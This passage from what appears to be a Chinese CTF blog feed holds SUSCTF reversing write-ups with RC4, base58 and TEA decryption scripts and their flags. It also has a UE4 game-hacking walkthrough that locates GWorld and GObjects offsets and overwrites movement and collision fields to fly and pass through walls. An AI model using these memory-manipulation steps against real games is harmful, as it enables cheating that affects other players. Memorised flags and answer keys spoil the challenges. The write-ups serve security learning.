function_">rc4_crypt</span>(<span class="params">data: <span class="built_in">bytes</span>, key: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    state = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + state[i] + key[i % <span class="built_in">len</span>(key)]) &amp; <span class="number">0xFF</span></span><br><span class="line">        state[i], state[j] = state[j], state[i]</span><br><span class="line"></span><br><span class="line">    out = <span class="built_in">bytearray</span>()</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> data:</span><br><span class="line">        i = (i + <span class="number">1</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">        j = (j + state[i]) &amp; <span class="number">0xFF</span></span><br><span class="line">        state[i], state[j] = state[j], state[i]</span><br><span class="line">        k = state[(state[i] + state[j]) &amp; <span class="number">0xFF</span>]</span><br><span class="line">        out.append(byte ^ k)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(out)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    mutated_key = mutate_key(KEY_BYTES.copy())</span><br><span class="line">    flag = rc4_crypt(CIPHERTEXT, mutated_key)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> rc4_crypt(flag, mutated_key) != CIPHERTEXT:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;sanity check failed; ciphertext mismatch&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;mutated key:&quot;</span>, mutated_key.decode())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;flag:&quot;</span>, flag.decode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>susctf{de094624-8f5b-44dc-810c-58132a2b5ea3}</p><h3 id="一个饼干人"><a href="#一个饼干人" class="headerlink" title="一个饼干人"></a>一个饼干人</h3><p>Il2CppDumper 检测到“<strong>This file may be protected</strong>”——说明 so 有防护&#x2F;修改，导致它<strong>选择不生成或生成失败</strong>对 IDA&#x2F;Ghidra 的自动重命名脚本。</p><p>github上面的解释</p><blockquote><p>Il2CppDumper检测到可执行文件已被保护，使用<code>GameGuardian</code>从游戏内存中dump <code>libil2cpp.so</code>，然后使用Il2CppDumper载入按提示操作，可绕过大部分保护</p></blockquote><p>这里思路开始偏了，开始去用师傅的另一个项目去拿dump.cs</p><p>拿到之后，又偏了分析libcpp.so导入xx.h和xx.json这俩文件花了1个小时左右</p><p>最后发现逻辑无法分析，然后开始思考cookie</p><p>在asset下发现了delicous，查了下可以解包，用assetstudio没解出来</p><p>用的assetripper解出来了</p><p>手慢了大概没一会，本来二血，居然是小写的c….</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251004205252977.png" alt="image-20251004205252977"></p><p>SUSCTF{cookies_GOOD}</p><h3 id="ezsignin"><a href="#ezsignin" class="headerlink" title="ezsignin"></a>ezsignin</h3><p>patch掉花指令，得到主逻辑，中间还有base58，rc4…</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251005104309406.png" alt="image-20251005104309406"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">alphabet = <span class="string">&quot;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&quot;</span></span><br><span class="line">value_map = &#123;c: i <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(alphabet)&#125;</span><br><span class="line">target = (</span><br><span class="line">    <span class="string">&quot;2wHFw6XRQFJexwYcizWFJVU87GnPPbuRZF99t8884SxTeRptgvAmfzdqmE9skCSR&quot;</span></span><br><span class="line">    <span class="string">&quot;bEMUc8r5WcGQ4aq8gJQ2fpUQgiiNvkEQXL4GoQ5rBZfejYFtEpTA5x1kybteneAuE&quot;</span></span><br><span class="line">    <span class="string">&quot;Cqp3uLCDnuU4GwD1kKet8Bmqb4eidPWEcr6bSNNU3wr5xxtHpc43TyHMSKggBRZr&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b58decode</span>(<span class="params">s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> s:</span><br><span class="line">        num = num * <span class="number">58</span> + value_map[ch]</span><br><span class="line">    out = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">while</span> num:</span><br><span class="line">        num, rem = <span class="built_in">divmod</span>(num, <span class="number">256</span>)</span><br><span class="line">        out.append(rem)</span><br><span class="line">    out.reverse()</span><br><span class="line">    leading = <span class="built_in">len</span>(s) - <span class="built_in">len</span>(s.lstrip(<span class="string">&quot;1&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([<span class="number">0</span>] * leading) + <span class="built_in">bytes</span>(out)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">layer = target</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    decoded = b58decode(layer)</span><br><span class="line">    <span class="keyword">if</span> i &lt; <span class="number">4</span>:</span><br><span class="line">        layer = decoded.decode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        original = decoded</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">bytes</span>(b ^ <span class="number">0x66</span> <span class="keyword">for</span> b <span class="keyword">in</span> original).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>susctf{Oh_My_G0d_You_@re_Rev3rse_God!!!}</p><h3 id="made-in-haven"><a href="#made-in-haven" class="headerlink" title="made-in-haven"></a>made-in-haven</h3><p>看到haven就想到了dubhectf做的一道天堂之门的题目…</p><p>看了下附件有很多retn和花指令混淆，都path掉再F5就可以得到主逻辑</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251007095901048.png" alt="image-20251007095901048"></p><p>先对key前8位和后8位做xor和sub</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251007100352051.png" alt="image-20251007100352051"></p><p>然后一个简单的TEA即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64, struct</span><br><span class="line"></span><br><span class="line">TWEAK_XOR = [<span class="number">0x01</span>, <span class="number">0x09</span>, <span class="number">0x02</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x01</span>, <span class="number">0x07</span>]</span><br><span class="line">TWEAK_SUB = [<span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x05</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>]</span><br><span class="line">KEY_SEED = <span class="built_in">bytearray</span>(<span class="string">b&#x27;elgvdislhapybsy&quot;&#x27;</span>)</span><br><span class="line">CIPHER = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;6f470a56d13abcf8e393c2a6118f0b6ff77da5815732b3f5618570a0e19339ec&quot;</span>)</span><br><span class="line">DELTA = <span class="number">0xDEADBEEF</span></span><br><span class="line">ROUNDS = <span class="number">32</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(KEY_SEED) == <span class="number">16</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(TWEAK_XOR) &gt;= <span class="number">8</span> <span class="keyword">and</span> <span class="built_in">len</span>(TWEAK_SUB) &gt;= <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Phase 1 (xor-type)</span></span><br><span class="line"><span class="keyword">for</span> i, tweak <span class="keyword">in</span> <span class="built_in">enumerate</span>(TWEAK_XOR[:<span class="number">8</span>]):</span><br><span class="line">    t = (tweak) &amp; <span class="number">0xFF</span></span><br><span class="line">    KEY_SEED[i] = ((KEY_SEED[i] ^ t) ) &amp; <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Phase 2 (sub-type) — simplified equivalence: ((* - (b-1)) - 1) == (* - b)</span></span><br><span class="line"><span class="keyword">for</span> i, tweak <span class="keyword">in</span> <span class="built_in">enumerate</span>(TWEAK_SUB[:<span class="number">8</span>]):</span><br><span class="line">    KEY_SEED[<span class="number">8</span> + i] = (KEY_SEED[<span class="number">8</span> + i] - (tweak &amp; <span class="number">0xFF</span>)) &amp; <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line">KEY = struct.unpack(<span class="string">&quot;&lt;4I&quot;</span>, <span class="built_in">bytes</span>(KEY_SEED))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tea_decrypt_block</span>(<span class="params">v0, v1</span>):</span><br><span class="line">    total = (DELTA * ROUNDS) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(ROUNDS):</span><br><span class="line">        v1 = (v1 - (((v0 &lt;&lt; <span class="number">4</span>) + KEY[<span class="number">2</span>]) ^ (v0 + total) ^ ((v0 &gt;&gt; <span class="number">5</span>) + KEY[<span class="number">3</span>]))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 = (v0 - (((v1 &lt;&lt; <span class="number">4</span>) + KEY[<span class="number">0</span>]) ^ (v1 + total) ^ ((v1 &gt;&gt; <span class="number">5</span>) + KEY[<span class="number">1</span>]))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        total = (total - DELTA) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">return</span> v0, v1</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">bytearray</span>()</span><br><span class="line"><span class="keyword">for</span> off <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(CIPHER), <span class="number">8</span>):</span><br><span class="line">    block = struct.unpack(<span class="string">&quot;&lt;2I&quot;</span>, CIPHER[off:off + <span class="number">8</span>])</span><br><span class="line">    flag += struct.pack(<span class="string">&quot;&lt;2I&quot;</span>, *tea_decrypt_block(*block))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>( <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(b) <span class="keyword">if</span> <span class="number">32</span>&lt;=b&lt;=<span class="number">126</span> <span class="keyword">else</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">for</span> b <span class="keyword">in</span> flag))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>susctf{sp33d_up_time_t0_h34v3n!}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SUSCTF-wp&quot;&gt;&lt;a href=&quot;#SUSCTF-wp&quot; class=&quot;headerlink&quot; title=&quot;SUSCTF wp&quot;&gt;&lt;/a&gt;SUSCTF wp&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://luhaoblog.oss-cn-hangzho</summary>
      
    
    
    
    <category term="CTF wp" scheme="http://matriy330.github.io/categories/CTF-wp/"/>
    
    
    <category term="wp" scheme="http://matriy330.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>UE4逆向初探-OverWatch</title>
    <link href="http://matriy330.github.io/791560d6/"/>
    <id>http://matriy330.github.io/791560d6/</id>
    <published>2025-10-14T15:07:30.000Z</published>
    <updated>2025-10-14T15:08:09.326Z</updated>
    
    <content type="html"><![CDATA[<h1 id="UE4逆向初探-OverWatch"><a href="#UE4逆向初探-OverWatch" class="headerlink" title="UE4逆向初探-OverWatch"></a>UE4逆向初探-OverWatch</h1><p>可以看这个<a href="https://xz.aliyun.com/course-view?id=36">线上培训 -先知社区</a></p><p><strong>赛后下面那个偏移问题(主要是被网上某篇瞎写的博客和IDA字符串加载给暗算了)解决了自己做了下直接出了一段flag，后一段flag没找到只能看wp了</strong></p><blockquote><p>好的!我知道了尴尬了，我还是太着急了，刚刚写这个wp的时候又打开来了(之前保存的i64)，搜了一下seamless，发现直接出现了，原来是IDA加载太慢了，我太急了，我就不该上课 T.T </p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013222036823.png" alt="image-20251013222036823"></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013221924088.png" alt="image-20251013221924088"></p></blockquote><p>dump工具：<a href="https://github.com/Spuckwaffel/UEDumper">Spuckwaffel&#x2F;UEDumper: The most powerful Unreal Engine Dumper and Editor for UE 4.19 - 5.3</a></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251012162204075.png" alt="image-20251012162204075"></p><p>可以看这个视频</p><p><a href="https://www.youtube.com/watch?v=M7VLd1xrVoM">https://www.youtube.com/watch?v=M7VLd1xrVoM</a></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251012172315439.png" alt="image-20251012172315439"></p><p>说一下找三件套吧</p><p>Fname找ByteObject</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014102225239.png" alt="image-20251014102225239"></p><p>交叉引用这个方法，是最上面那个</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014102258624.png" alt="image-20251014102258624"></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014102334465.png" alt="image-20251014102334465"></p><p>第一个偏移：0x4869C80</p><blockquote><p>ps：可以看那个印度佬的视频，挺好的，先去rebase里把机制定位0</p></blockquote><p>找UWorld时，我是IDA没加载出来这个”Seamless”字符串</p><blockquote><p>关于如何对照源码<a href="https://www.bilibili.com/video/BV19R4y1g7i3/?spm_id_from=333.1007.top_right_bar_window_custom_collection.content.click&vd_source=d76ad0aadca055336653cd966075f064">虚幻4 UE4 逆向 寻找 世界地址 UWORLD地址 教程_哔哩哔哩_bilibili</a></p><p>可以先去github把对应版本的源码下载下来，需要加入epicgame组织先，</p></blockquote><p>所以我对照了源码最终找到一个</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014102621791.png" alt="image-20251014102621791"></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014102704430.png" alt="image-20251014102704430"></p><p>当然常规的方法更简单一点</p><blockquote><p>搜索： SeamlessTravel FlushLevelStreaming</p></blockquote><p>往上直接找到：</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014103045269.png" alt="image-20251014103045269"></p><p>第二个uworld有了：49ee370</p><p>第三个gobject，我也是死在这了…</p><p>我找的偏移是0x48A5FC0</p><p>看了wp发现是：0x48A5FD0</p><p>….</p><p>就差0x10，可能是数据结构哪里搞错了应该</p><p>当时找了</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014104421969.png" alt="image-20251014104421969"></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014104434870.png" alt="image-20251014104434870"></p><p>当时字符串没加载出来，简单的把48A5FC0作为Gobject肯定不对，都跟上面不太像其实</p><p>实际上被误导了?</p><p><a href="https://www.cnblogs.com/revercc/p/17641855.html#%E5%AF%BB%E6%89%BEguobjectarray">ue5游戏逆向之寻找GWorld，GName和GUObjectArray - 怎么可以吃突突 - 博客园</a></p><p>这里虽然是ue5的方法，但是道理应该差不多，为什么偏移不对?</p><p>官解搜索的是：NewObject with….</p><p>可是我看了下引用：</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014105547046.png" alt="image-20251014105547046"></p><p>这找个damn…</p><p>不知道是不是我IDA的原因</p><p>运气足够好,第二个就是</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014105748059.png" alt="image-20251014105748059"></p><p>但是我并没有找到源码中对应的寻找方式，可能是源码中把NewObject字符串包装了，得搜索引用这个函数的才能去找GUObject</p><p>推荐搜索Failed to load Enginee class，跟刚才的NewObject With到达的是一个地方</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014110256024.png" alt="image-20251014110256024"></p><p>48A5FD0</p><p>offset.h里填好</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014110520421.png" alt="image-20251014110520421"></p><p>dump成功如下</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014110946452.png" alt="image-20251014110946452"></p><p>后面就是游戏逆向，猜测flag在墙外，因而只有几种常规方法：透视(墙不见) 穿墙 飞天遁地</p><p>在merged_AudioMixer_Engine_UMG_MovieScene_MovieSceneTracks.h种有</p><blockquote><p>这个文件不是引擎原生的源码文件，而是 <strong>自动合并生成的头文件</strong>，</p><p>目的是把多个模块导出的类、枚举、结构体合并在一个文件中方便分析。</p></blockquote><p>这个枚举定义在 UE 原版引擎中是 <strong>角色移动组件（Character Movement Component）</strong> 的核心枚举</p><table><thead><tr><th>模式</th><th>场景举例</th><th>行为逻辑</th></tr></thead><tbody><tr><td><code>MOVE_None</code></td><td>不可移动（如被眩晕、冻结）</td><td>停止更新物理</td></tr><tr><td><code>MOVE_Walking</code></td><td>在地面上走</td><td>使用地面摩擦力、速度计算</td></tr><tr><td><code>MOVE_NavWalking</code></td><td>AI 路径导航行走</td><td>使用 NavMesh</td></tr><tr><td><code>MOVE_Falling</code></td><td>从高处坠落</td><td>使用重力</td></tr><tr><td><code>MOVE_Swimming</code></td><td>在水中游动</td><td>使用流体阻力、浮力</td></tr><tr><td><code>MOVE_Flying</code></td><td>飞行类角色（如幽灵、飞行器）</td><td>关闭重力，使用自由三维移动</td></tr><tr><td><code>MOVE_Custom</code></td><td>自定义移动，如“攀爬”、“滑行”</td><td>游戏开发者自己扩展逻辑</td></tr></tbody></table><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014193847028.png" alt="image-20251014193847028"></p><p>我们能发现这里还有</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014201041665.png" alt="image-20251014201041665"></p><p>ACharacter是什么?</p><blockquote><p>ACharacter：UE4 自带的行走类Actor，继承自 APawn。含网格体、胶囊体、UCharacterMovementComponent 等，负责角色移动、跳跃等行为。你操作飞行&#x2F;穿墙时的目标对象就是本地玩家的 ACharacter 实例</p></blockquote><p>这些是 <strong>编译时静态断言（static_assert）</strong>，用于验证 <strong>类成员变量的内存偏移</strong>是否正确。</p><p><code>UCharacterMovementComponent::MovementMode</code> 与 <code>PendingLaunchVelocity</code>这些字段属于 <code>UCharacterMovementComponent</code>（角色移动组件），控制角色的物理状态。</p><p>我们除了这些关键属性之外还需要知道世界链路</p><p>在 UE 逆向中，<strong>找到世界链路</strong> 是理解游戏对象体系的关键。</p><p><strong>世界结构简图：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GWorld → UWorld</span><br><span class="line">         ├─ PersistentLevel (ULevel)</span><br><span class="line">         │   ├─ AActor[0] = DefaultPawn</span><br><span class="line">         │   ├─ AActor[1] = PlayerCharacter</span><br><span class="line">         │   └─ ...</span><br><span class="line">         ├─ GameInstance</span><br><span class="line">         ├─ GameMode</span><br><span class="line">         ├─ PlayerController</span><br><span class="line">         └─ etc.</span><br></pre></td></tr></table></figure><table><thead><tr><th>名称</th><th>类型</th><th>含义</th></tr></thead><tbody><tr><td><strong><code>GWorld</code></strong></td><td><code>UWorld*</code> 全局指针</td><td>当前正在运行的世界（全局变量）</td></tr><tr><td><strong><code>UWorld</code></strong></td><td>类对象</td><td>世界实例本身，包含关卡、玩家、Actor 列表等</td></tr></tbody></table><blockquote><p><code>GWorld</code> 就是指向当前 <code>UWorld</code> 的全局变量。</p></blockquote><p>在内存调试中，通常会通过 <code>GWorld</code> 找到整个世界的根：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UWorld* World = GWorld;</span><br><span class="line">ULevel* Level = World-&gt;PersistentLevel;</span><br><span class="line">TArray&lt;AActor*&gt; Actors = Level-&gt;Actors;</span><br></pre></td></tr></table></figure><p>这样就能遍历世界中所有的角色对象。</p><table><thead><tr><th>元素</th><th>含义</th><th>逆向用途</th></tr></thead><tbody><tr><td><code>offsetof</code></td><td>成员偏移</td><td>定位内存字段、直接读写对象成员</td></tr><tr><td><code>CharacterMovement</code></td><td>角色移动组件指针</td><td>控制角色物理行为（走、飞、跳）</td></tr><tr><td><code>CapsuleComponent</code></td><td>碰撞体组件</td><td>检测碰撞、修改 hitbox 尺寸</td></tr><tr><td><code>MovementMode</code></td><td>当前移动模式</td><td>判断或强制移动状态</td></tr><tr><td><code>PendingLaunchVelocity</code></td><td>等待应用的速度</td><td>修改跳跃或击飞效果</td></tr><tr><td><code>GWorld → UWorld</code></td><td>世界根节点</td><td>遍历所有 Actor，找到玩家对象</td></tr></tbody></table><p>在游戏中找到了玩家对象地址 <code>PlayerCharacter</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UCharacterMovementComponent* MoveComp =  *(UCharacterMovementComponent**)(PlayerCharacter + 0x288);</span><br></pre></td></tr></table></figure><p>接下来：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MoveComp-&gt;MovementMode = EMovementMode::MOVE_Flying;</span><br><span class="line">MoveComp-&gt;PendingLaunchVelocity = FVector(0, 0, 3000);</span><br></pre></td></tr></table></figure><p>角色立刻能在空中飞行或超高跳。</p><ul><li>UWorld::OwningGameInstance：指向当前世界所属的 UGameInstance。GameInstance 持有全局状态，如本地玩家列表、子系统等，是沿 GWorld 找到你这边玩家控制器的入口。</li><li>APawn：可被玩家或 AI 控制的 Actor 基类。ACharacter 就是 APawn 的一个扩展版本，加入了骨骼网格和 CharacterMovement。</li><li>APlayerController::AcknowledgedPawn：玩家控制器当前“正式控制”的 Pawn 指针。正常游戏里它就是你的角色 Pawn（如 ACharacter），读取后才能继续修改移动组件&#x2F;碰撞。</li><li>APlayerController：表示本地或远端的玩家控制器，处理输入、相机、HUD 等。我们从 UGameInstance::LocalPlayers 取得的 ULocalPlayer-&gt;PlayerController 就是本地玩家的控制器，顺着它的 AcknowledgedPawn 拿到角色后才能进行后续 hack。</li></ul><p>世界链路</p><ul><li>GWorld（基址 base + 0x49EE370，与setOffsets() 中 OFFSET_GWORLD 相符）指向当前关卡对应的 UWorld。</li><li>UWorld + 0x180（OwningGameInstance）拿到 UGameInstance，这是全局封装玩家列表的对象。</li><li>UGameInstance + 0x38（LocalPlayers 的 TArray）提供本地玩家数组，下标 0 通常是本地玩家。</li><li>ULocalPlayer-&gt;PlayerController（UPlayer::PlayerController 在 …:8986 给出 0x30）接到 APlayerController，再用 AcknowledgedPawn 偏移 0x2A0 取到实际 Pawn。</li><li>Pawn + 0x288（CharacterMovement）就能定位 UCharacterMovementComponent；后续通过 MovementMode、PendingLaunchVelocity 等偏移修改为飞行或冲刺，或者抓取 CapsuleComponent(0x290) 调 SetCollisionEnabled 实现穿墙。</li></ul><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014220645122.png" alt="image-20251014220645122"></p><p>在编写代码时我们可以用reinterpret_cast</p><p>reinterpret_cast<T>(expr) 是 C++ 提供的强制类型转换之一：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在没有类型信息/类定义不足的情况下，把某个指针或整数当成别的类型的指针来访问。</span><br><span class="line">与UE这类内存操作结合时，我们经常只有偏移值，所以先把基址转成 uint8_t*，加偏移后再 reinterpret_cast&lt;目标类型*&gt;，这样就能把那块内存看成某个字段或结构。</span><br></pre></td></tr></table></figure><p>FVector 在 BasicType.h 里被定义成三个 float 分量（X&#x2F;Y&#x2F;Z）。C++ 允许对这种简单结构做聚合初始化，{a, b, c} 就会依次填入 X&#x2F;Y&#x2F;Z，所以 {0.f, 0.f, 800.f} 会写成 (0,0,800)。</p><p>数值 800&#x2F;600 只是示例：PendingLaunchVelocity 相当于给角色一个即将施加的冲量，LastUpdateVelocity 是当前速度。这两个字段只要写入任何 FVector，UE4 就会按这些分量处理运动；如果想要更慢或更快的上升，可以自己改成别的值。</p><p>exp：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span 